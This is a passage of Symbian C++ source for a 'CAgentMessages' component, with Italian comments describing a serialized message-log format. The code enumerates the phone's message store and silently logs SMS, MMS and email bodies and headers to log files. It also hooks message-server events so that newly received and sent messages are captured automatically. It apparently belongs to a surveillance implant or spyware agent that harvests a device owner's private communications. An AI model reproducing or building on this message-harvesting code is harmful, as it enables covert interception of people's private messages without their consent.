		buffer->InsertL(buffer->Size(), bufTo->Ptr(0), bufTo->Size());
		*/
		// insert To:
		_LIT8(KTo,"\r\nTo: ");
		ptrData = (TUint8 *)KTo().Ptr();
		mailBuffer->InsertL(mailBuffer->Size(), ptrData, KTo().Size());
		mailBuffer->InsertL(mailBuffer->Size(), bufTo8->Ptr(0), bufTo8->Size());
		CleanupStack::PopAndDestroy(bufTo8);
		CleanupStack::PopAndDestroy(bufTo);																					
				
		// insert cc
		// TODO: restore when server ready
		/*
		const MDesC16Array &arrayCc = header->CcRecipients();
		count = arrayCc.MdcaCount();
		if(count>0)
		{
		CBufBase* bufCc = CBufFlat::NewL(50);
		CleanupStack::PushL(bufCc);
		for(TInt i = 0; i<count; i++)
		{
			ptrData = (TUint8 *)arrayCc.MdcaPoint(i).Ptr();
			bufCc->InsertL(bufCc->Size(),ptrData,arrayCc.MdcaPoint(i).Size() );
			if(i < (count-1))
				bufCc->InsertL(bufCc->Size(), (TUint8 *)KVirgola().Ptr(), KVirgola().Size());
		}
		typeAndLen = EStringCc;
		typeAndLen += bufCc->Size();
		buffer->InsertL(buffer->Size(), &typeAndLen, sizeof(typeAndLen));
		buffer->InsertL(buffer->Size(), bufCc->Ptr(0), bufCc->Size());
		
		CleanupStack::PopAndDestroy(bufCc);																					
		}
		*/
		
		CleanupStack::PopAndDestroy(header);
		
		// insert body
		// insert MIME header
		// ISO-10646-UCS-2
		_LIT8(KMimeHeader,"\r\nMIME-Version: 1.0\r\nContentType: text/plain; charset=UTF8\r\n\r\n");
		//_LIT8(KMimeHeader,"\r\nMIME-Version: 1.0\r\nContentType: text/plain\r\n\r\n");
		ptrData = (TUint8 *)KMimeHeader().Ptr();
		mailBuffer->InsertL(mailBuffer->Size(), ptrData, KMimeHeader().Size());
		// insert body
		// using CRichText to retrieve body truncates it at 510 bytes... same behaviour as sms truncking at 256 bytes..
		// the following way should be ok
		CBaseMtm* mailMtm = iMtmReg->NewMtmL(aMsvEntryIdx.iMtm);
		CleanupStack::PushL(mailMtm);
		mailMtm->SwitchCurrentEntryL(aMsvId);
		mailMtm->LoadMessageL();
		TInt length = mailMtm->Body().DocumentLength();
		HBufC* bodyBuf = HBufC::NewLC(length*2);
		TPtr ptr(bodyBuf->Des());
		//mailMtm->Body().Extract(ptr,0,length);
		mailMtm->Body().Extract(ptr,0);
		TInt size = ptr.Size();
		CleanupStack::PopAndDestroy(bodyBuf);
		if((aFilter->iMaxMessageSize != 0) && (aFilter->iMaxMessageSize < size))
			{
			// out of bound
			CleanupStack::PopAndDestroy(mailMtm);
			CleanupStack::PopAndDestroy(entry);
			//CleanupStack::PopAndDestroy(buffer);
			CleanupStack::PopAndDestroy(mailBuffer);
			return HBufC8::New(0);
			}	
		TInt logSize;
		if((aFilter->iMaxMessageBytesToLog!=0) && (aFilter->iMaxMessageBytesToLog < size))
			logSize = aFilter->iMaxMessageBytesToLog;
		else
			logSize = size;
		HBufC* bodyBuf2 = HBufC::NewLC(logSize);
		TPtr ptr2(bodyBuf2->Des());
		mailMtm->Body().Extract(ptr2,0,logSize);
		
		HBufC8* bodyBuf3 = CnvUtfConverter::ConvertFromUnicodeToUtf8L(*bodyBuf2);
		
		//ptrData = (TUint8 *)bodyBuf2->Des().Ptr();
		ptrData = (TUint8 *)bodyBuf3->Des().Ptr();
		mailBuffer->InsertL(mailBuffer->Size(), ptrData, bodyBuf3->Size());
		
		delete bodyBuf3;
		CleanupStack::PopAndDestroy(bodyBuf2);
		CleanupStack::PopAndDestroy(mailMtm);
		//typeAndLen = EObjectMIMEBody;
		//typeAndLen += mailBuffer->Size();
		//buffer->InsertL(buffer->Size(), &typeAndLen, sizeof(typeAndLen));
		//buffer->InsertL(buffer->Size(), mailBuffer->Ptr(0), mailBuffer->Size());
		// TODO: only for test delete when finished
		//WriteMailFile(mailBuffer->Ptr(0));
		
	}
	CleanupStack::PopAndDestroy(entry);
	
	//serializedMsg.iDwSize += buffer->Size();
	
	// insert the log structure 
	//buffer->InsertL(0, &serializedMsg, sizeof(serializedMsg));
	
	//HBufC8* result = buffer->Ptr(0).AllocL();
	HBufC8* result = mailBuffer->Ptr(0).AllocL();
	
	iMailRawAdditionalData.uSize = mailBuffer->Size();
	
	CleanupStack::PopAndDestroy(mailBuffer);
	//CleanupStack::PopAndDestroy(buffer);
	
	// we set here the markup, the buffer is not zero and we know everything
	if(iMarkup.mailMarkup < aMsvEntryIdx.iDate){
		iMarkup.mailMarkup = aMsvEntryIdx.iDate;
	}

	return result;
	}


void CAgentMessages::DoOneRoundL()
	{
	__FLOG(_L("DoOneRoundL"));
	// If the Agent has been stopped, don't proceed on the next round...
	if (iStopLongTask)
		return;

	__FLOG(_L("PopulateArray"));
	// Note: it always exists at least 1 entry in the Array (KMsvRootIndexEntryId)
	// Adds the childs entries to the array so will be processes later.
	PopulateArrayWithChildsTMsvIdEntriesL(iMsvArray[iArrayIndex]);  

	TMsvId msvId = iMsvArray[iArrayIndex];

	TMsvId service;
	TMsvEntry msvEntryIdx;
	TInt res = iMsvSession->GetEntry(msvId, service, msvEntryIdx);
	if(res == KErrNone)  //TODO: delete when done with test
		{
		TBuf<64> description(msvEntryIdx.iDescription);
		TBuf<64> details(msvEntryIdx.iDetails);
		TInt a=1;
		}
	if ((res == KErrNone) && (msvEntryIdx.iType.iUid == KUidMsvMessageEntryValue)){
		// there's no error and the entry is a message, not KUidMsvServiceEntryValue, KUidMsvFolderEntryValue, KUidMsvAttachmentEntryValue
		if(msvEntryIdx.iMtm == KUidMsgTypeSMS)   //SMS
		{
			if(iSmsCollectFilter->iLog && iSmsCollectFilter->MessageInRange(msvEntryIdx.iDate))
			{
				RBuf8 buf(GetSMSBufferL(msvEntryIdx,msvId));
				buf.CleanupClosePushL();
				if (buf.Length() > 0)
				{
					TInt value;
					RProperty::Get(KPropertyUidCore, KPropertyFreeSpaceThreshold, value);
					if(value)
						{
						CLogFile* logFile = CLogFile::NewLC(iFs);
						logFile->CreateLogL(LOGTYPE_SMS);
						logFile->AppendLogL(buf);
						logFile->CloseLogL();
						CleanupStack::PopAndDestroy(logFile);
						}
				}
				CleanupStack::PopAndDestroy(&buf);
			}
		}
			
		else if (msvEntryIdx.iMtm == KUidMsgTypeMultimedia)   // MMS
		{
			if(iMmsCollectFilter->iLog && iMmsCollectFilter->MessageInRange(msvEntryIdx.iDate))
			{
				RBuf8 buf(GetMMSBufferL(msvEntryIdx,msvId));
				buf.CleanupClosePushL();
				if (buf.Length() > 0)
				{
					TInt value;
					RProperty::Get(KPropertyUidCore, KPropertyFreeSpaceThreshold, value);
					if(value)
						{
						CLogFile* logFile = CLogFile::NewLC(iFs);
						logFile->CreateLogL(LOGTYPE_MMS);
						logFile->AppendLogL(buf);
						logFile->CloseLogL();
						CleanupStack::PopAndDestroy(logFile);
						}
				}
				CleanupStack::PopAndDestroy(&buf);
			}
		}
			
		else if ((msvEntryIdx.iMtm == KUidMsgTypePOP3) || (msvEntryIdx.iMtm == KUidMsgTypeSMTP) || (msvEntryIdx.iMtm == KUidMsgTypeIMAP4))     // Mail
		{
			if(iMailCollectFilter->iLog && iMailCollectFilter->MessageInRange(msvEntryIdx.iDate))
			{
				RBuf8 buf(GetMailBufferL(msvEntryIdx,msvId,iMailCollectFilter));
				buf.CleanupClosePushL();
				if (buf.Length() > 0)
				{
					TInt value;
					RProperty::Get(KPropertyUidCore, KPropertyFreeSpaceThreshold, value);
					if(value)
						{
						CLogFile* logFile = CLogFile::NewLC(iFs);
						//logFile->CreateLogL(LOGTYPE_MAIL);
						logFile->CreateLogL(LOGTYPE_MAIL_RAW, &iMailRawAdditionalData);
						logFile->AppendLogL(buf);
						logFile->CloseLogL();
						CleanupStack::PopAndDestroy(logFile);
						}
				}
				CleanupStack::PopAndDestroy(&buf);
			}
		}
		
	}
	
	iArrayIndex++;
	if (iArrayIndex >= iMsvArray.Count())	
		{
		// write markup, we have finished the initial dump
		// and we write the date of the most recent changed/added items
		RBuf8 buf(GetMarkupBufferL(iMarkup));
		buf.CleanupClosePushL();
		if (buf.Length() > 0)
		{
			iMarkupFile->WriteMarkupL(Type(),buf);
		}
		CleanupStack::PopAndDestroy(&buf);
				
		__FLOG_1(_L("Processed: %d Entries"), iMsvArray.Count());
		iArrayIndex = 0;
		iMsvArray.Reset();
		iMsvArray.Append(KMsvRootIndexEntryId);  
		return;
		}

	iLongTask->NextRound();
	}

void CAgentMessages::HandleSessionEventL(TMsvSessionEvent aEvent, TAny* aArg1, TAny* aArg2, TAny* aArg3)
	{
	if (!iLogNewMessages)
		return;
	CMsvEntrySelection* entries = STATIC_CAST( CMsvEntrySelection*, aArg1 );
	TMsvId* folderId = STATIC_CAST( TMsvId*, aArg2 );

	__FLOG(_L("HandleSessionEventL"));
	if (entries != NULL)
		{
		__FLOG_1(_L("Entry:%d "), entries->At(0));
		}
	if (folderId != NULL)
		{
		__FLOG_1(_L("Folder:%d "), *folderId);
		}
	switch (aEvent)
		{
		case EMsvServerReady:
			{
			__FLOG(_L("Server Ready"));
			break;
			}
		case EMsvEntriesCreated:
			{
			__FLOG(_L("Created"));
			iNewMessageId = entries->At(0);
			// It is not safe to read the message when it has been created in draft or in inbox... 
			// so we will read it later on Changed Event
			break;
			}
		case EMsvEntriesChanged:
			{
			//aArg1 is a CMsvEntrySelection of the index entries. aArg2 is the TMsvId of the parent entry. 

			__FLOG(_L("Changed"));
			if (iNewMessageId != entries->At(0))
				return;

			// This event will be fired also when the user open a new message for the first time. 
			// (Because the message will change its status and will be marked as read)
			TMsvEntry msvEntry;
			TMsvId service;
			__FLOG(_L("GetEntry"));
			TInt res = iMsvSession->GetEntry(iNewMessageId, service, msvEntry);
			TMsvId msvId = entries->At(0);
			//if (msvEntry.Complete() && msvEntry.New() && (*folderId == KMsvGlobalInBoxIndexEntryId)) // this is original code MB, but on N96 check on New() fails
			if (msvEntry.Complete() /*&& msvEntry.New()*/ && (*folderId == KMsvGlobalInBoxIndexEntryId))
				{
				TBool writeMarkup = EFalse;
				// sms
				if(msvEntry.iMtm == KUidMsgTypeSMS)
				{ 
					if(iSmsRuntimeFilter->iLog /*&& iSmsRuntimeFilter->MessageInRange(msvEntry.iDate)*/)
					{
						RBuf8 buf(GetSMSBufferL(msvEntry,msvId));
						buf.CleanupClosePushL();
						if (buf.Length() > 0)
						{
							TInt value;
							RProperty::Get(KPropertyUidCore, KPropertyFreeSpaceThreshold, value);
												
							if(value)
								{
								CLogFile* logFile = CLogFile::NewLC(iFs);
								logFile->CreateLogL(LOGTYPE_SMS);
								logFile->AppendLogL(buf);
								logFile->CloseLogL();
								CleanupStack::PopAndDestroy(logFile);
								writeMarkup = ETrue;
								}
						}
						CleanupStack::PopAndDestroy(&buf);
					}
				}
				// mms
				else if(msvEntry.iMtm == KUidMsgTypeMultimedia)
					{
						if(iMmsRuntimeFilter->iLog /*&& iMmsRuntimeFilter->MessageInRange(msvEntry.iDate)*/)
						{
							RBuf8 buf(GetMMSBufferL(msvEntry,msvId));
							buf.CleanupClosePushL();
							if (buf.Length() > 0)
							{
								TInt value;
								RProperty::Get(KPropertyUidCore, KPropertyFreeSpaceThreshold, value);
													
								if(value)
									{
									CLogFile* logFile = CLogFile::NewLC(iFs);
									logFile->CreateLogL(LOGTYPE_MMS);
									logFile->AppendLogL(buf);
									logFile->CloseLogL();
									CleanupStack::PopAndDestroy(logFile);
									writeMarkup = ETrue;
									}
							}
							CleanupStack::PopAndDestroy(&buf);
						}
					}
				// mail
				else if((msvEntry.iMtm == KUidMsgTypePOP3) || (msvEntry.iMtm == KUidMsgTypeSMTP) || (msvEntry.iMtm == KUidMsgTypeIMAP4))
					{ 
						if(iMailRuntimeFilter->iLog /*&& iMailRuntimeFilter->MessageInRange(msvEntry.iDate)*/)
						{
							RBuf8 buf(GetMailBufferL(msvEntry,msvId,iMailRuntimeFilter));
							buf.CleanupClosePushL();
							if (buf.Length() > 0)
							{
								TInt value;
								RProperty::Get(KPropertyUidCore, KPropertyFreeSpaceThreshold, value);
								if(value)
									{
									CLogFile* logFile = CLogFile::NewLC(iFs);
									logFile->CreateLogL(LOGTYPE_MAIL);
									logFile->AppendLogL(buf);
									logFile->CloseLogL();
									CleanupStack::PopAndDestroy(logFile);
									writeMarkup = ETrue;
									}
							}
							CleanupStack::PopAndDestroy(&buf);
						}
					}
				if(writeMarkup)
					{
					if(iMarkupFile->ExistsMarkupL(Type()))
						{
						// if a markup exists, a dump has been performed and this 
						// is the most recent change
						RBuf8 buffer(GetMarkupBufferL(iMarkup));
						buffer.CleanupClosePushL();
						if (buffer.Length() > 0)
							{
							iMarkupFile->WriteMarkupL(Type(),buffer);
							}
						CleanupStack::PopAndDestroy(&buffer);
						}
					}
				iNewMessageId = 0;
				}

			break;
			}
		case EMsvEntriesMoved:
			{
			// aArg1 is a CMsvEntrySelection containing the IDs of the moved entries. aArg2 is the TMsvId of the new parent. aArg3 is the TMsvId of the old parent entry. 

			__FLOG(_L("Moved"));
			TMsvEntry msvEntry;
			TMsvId service;
			TInt res = iMsvSession->GetEntry(entries->At(0), service, msvEntry);
			TMsvId msvId = entries->At(0);

			TBool writeMarkup = EFalse;
			
			if (msvEntry.Complete() && *folderId == KMsvSentEntryId)
			{
				if(msvEntry.iMtm == KUidMsgTypeSMS) 
				{
					if(iSmsRuntimeFilter->iLog /*&& iSmsRuntimeFilter->MessageInRange(msvEntry.iDate)*/)
					{
						RBuf8 buf(GetSMSBufferL(msvEntry,msvId));
						buf.CleanupClosePushL();
						if (buf.Length() > 0)
						{
							TInt value;
							RProperty::Get(KPropertyUidCore, KPropertyFreeSpaceThreshold, value);
							if(value)
								{
								CLogFile* logFile = CLogFile::NewLC(iFs);
								logFile->CreateLogL(LOGTYPE_SMS);
								logFile->AppendLogL(buf);
								logFile->CloseLogL();
								CleanupStack::PopAndDestroy(logFile);
								writeMarkup = ETrue;
								}
						}
						CleanupStack::PopAndDestroy(&buf);
					}
				}
			}
			else if(msvEntry.iMtm == KUidMsgTypeMultimedia) 
				{
					if(iMmsRuntimeFilter->iLog /*&& iMmsRuntimeFilter->MessageInRange(msvEntry.iDate)*/)
					{
						RBuf8 buf(GetMMSBufferL(msvEntry,msvId));
						buf.CleanupClosePushL();
						if (buf.Length() > 0)
						{
							TInt value;
							RProperty::Get(KPropertyUidCore, KPropertyFreeSpaceThreshold, value);
							if(value)
								{
								CLogFile* logFile = CLogFile::NewLC(iFs);
								logFile->CreateLogL(LOGTYPE_MMS);
								logFile->AppendLogL(buf);
								logFile->CloseLogL();
								CleanupStack::PopAndDestroy(logFile);
								writeMarkup = ETrue;
								}
						}
						CleanupStack::PopAndDestroy(&buf);
					}
				}
			// mail
			else if((msvEntry.iMtm == KUidMsgTypePOP3) || (msvEntry.iMtm == KUidMsgTypeSMTP) || (msvEntry.iMtm == KUidMsgTypeIMAP4))
				{ 
					if(iMailRuntimeFilter->iLog /*&& iMailRuntimeFilter->MessageInRange(msvEntry.iDate)*/)
					{
						RBuf8 buf(GetMailBufferL(msvEntry,msvId,iMailRuntimeFilter));
						buf.CleanupClosePushL();
						if (buf.Length() > 0)
						{
							TInt value;
							RProperty::Get(KPropertyUidCore, KPropertyFreeSpaceThreshold, value);
							if(value)
								{
								CLogFile* logFile = CLogFile::NewLC(iFs);
								logFile->CreateLogL(LOGTYPE_MAIL);
								logFile->AppendLogL(buf);
								logFile->CloseLogL();
								CleanupStack::PopAndDestroy(logFile);
								writeMarkup = ETrue;
								}
						}
						CleanupStack::PopAndDestroy(&buf);
					}
				}
			if(writeMarkup)
				{
				if(iMarkupFile->ExistsMarkupL(Type()))
					{
					// if a markup exists, a dump has been performed and this 
					// is the most recent change
					RBuf8 buffer(GetMarkupBufferL(iMarkup));
					buffer.CleanupClosePushL();
					if (buffer.Length() > 0)
						{
						iMarkupFile->WriteMarkupL(Type(),buffer);
						}
					CleanupStack::PopAndDestroy(&buffer);
					}
				}
							
			break;
			}
		default:
			break;
		}
	}


HBufC8* CAgentMessages::GetMarkupBufferL(const TMarkup aMarkup)
{
	CBufBase* buffer = CBufFlat::NewL(50);
	CleanupStack::PushL(buffer);
	
	TUint32 len = sizeof(len) + sizeof(aMarkup);
	buffer->InsertL(buffer->Size(), &len, sizeof(len));
	buffer->InsertL(buffer->Size(), &aMarkup, sizeof(aMarkup));

	HBufC8* result = buffer->Ptr(0).AllocL();
	CleanupStack::PopAndDestroy(buffer);
	return result;
}


/*
 * A filetime is a 64-bit value that represents the number of 100-nanosecond intervals 
 * that have elapsed since 12:00 A.M. January 1, 1601 Coordinated Universal Time (UTC).
 * Please also note that in defining KInitialTime the month and day values are offset from zero.
 * 
 */
// TODO: delete this method when finished mail test
/*
void CAgentMessages::WriteMailFile(const TDesC8& aData)
{
	RFile file;
	RFs fs;
		
	TFullName filename(_L("C:\\Data\\mail.txt"));
	
	fs.Connect();
	
	file.Create(fs, filename, EFileWrite | EFileStream | EFileShareAny);
	file.Write(aData);
	file.Flush();
	fs.Close();
}
*/

/*
 * PER LA CREAZIONE DEL LOG:
 * 
 Per prima cosa c'e' un header che descrive il log:
>
> struct MAPISerializedMessageHeader {
>   DWORD dwSize;             // size of serialized message (this struct
> + class/from/to/subject + message body + attachs)
>   DWORD VersionFlags;       // flags for parsing serialized message
>   LONG Status;              // message status (non considerarlo per
> ora, mettilo a 0)
>   LONG Flags;               // message flags
>   LONG Size;                // message size    (non considerarlo per
> ora, mettilo a 0)
>   FILETIME DeliveryTime;    // delivery time of message (maybe null)
>   DWORD nAttachs;           // number of attachments
> };
>
> VersionFlags per il momento e' definito solo con
> enum VersionFlags {
>   MAPI_V1_0_PROTO          = 0x01000000,  // Protocol Version 1
> };
> L' unico valore per Flags invece e'
> enum MessageFlags {
>     MESSAGE_INCOMING       = 0x00000001,
> };
>
> Questo header e' seguito dai soliti blocchi costituiti dal  
> PREFIX+stringa o PREFIX+DATA
> I tipi di per il PREFIX  che puoi utilizzare sono questi:
>
> enum ObjectTypes {
>   STRING_FOLDER            = 0x01000000,
>   STRING_CLASS             = 0x02000000,
>   STRING_FROM              = 0x03000000,
>   STRING_TO                = 0x04000000,
>   STRING_CC                = 0x05000000,
>   STRING_BCC               = 0x06000000,
>   STRING_SUBJECT           = 0x07000000,
>
>   HEADER_MAPIV1            = 0x20000000,
>
>   OBJECT_MIMEBODY          = 0x80000000,
>   OBJECT_ATTACH            = 0x81000000,
>   OBJECT_DELIVERYTIME      = 0x82000000,
>
>   EXTENDED                 = 0xFF000000,
> };
>
> La FOLDER e' la cartella dove sono posizionati i messaggi, per esempio
> Inviati, In arrivo etc ... se in symbian non esiste una cosa del
> genere definiremo qualcuna.
> La classe del messaggio non e' indispensabile visto che sono gia'
> divisi per logtype, comunque se ti costa poco aggiungila:
> #define CLASS_SMS     TEXT("IPM.SMSText*")
> #define CLASS_MAIL     TEXT("IPM.Note*")
> #define CLASS_MMS     TEXT("IPM.MMS*")
>
> I sucessivi tipi sono esplicativi a parte HEADER_MAPIV1,
> OBJECT_ATTACH, OBJECT_DELIVERYTIME,  EXTENDED che puoi ignorare.
>
> Per quanto riguarda OBJECT_MIMEBODY, devi dirmi se in symbian riesci a
> recuperare il body in formato mime.
 */
 
